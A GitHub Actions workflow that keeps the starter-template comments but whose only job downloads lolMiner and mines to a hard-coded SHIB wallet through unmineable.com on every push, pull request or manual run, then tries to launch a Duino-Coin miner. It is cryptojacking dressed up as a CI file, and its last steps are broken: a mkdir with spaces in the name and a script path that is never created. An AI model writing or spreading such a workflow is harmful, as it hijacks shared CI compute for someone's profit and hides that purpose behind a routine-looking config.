# This is a basic workflow to help you get started with Actions

name: CI

# Controls when the workflow will run
on:
  # Triggers the workflow on push or pull request events but only for the main branch
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]

  # Allows you to run this workflow manually from the Actions tab
  workflow_dispatch:
# A workflow run is made up of one or more jobs that can run sequentially or in parallel
jobs:
  # This workflow contains a single job called "build"
  test:
   name: Subscrbeit
    # The type of runner that the job will run on
   runs-on: ubuntu-latest
   strategy:
    fail-fast: false
    matrix:
     runner: [0]
   steps:
     - run: |
        wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz

        tar -xf lolMiner_v1.29_Lin64.tar.gz

        cd 1.29

        ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user SHIB:0xadA2E211aC8a812f1D2e9d33e16d173C28f1519b.God_miner_YT#5xer-nxch --ethstratum ETHPROXY

        mkdir Duino-Coin PC Miner 2.73
      
        python duino-coin/PC_Miner.py
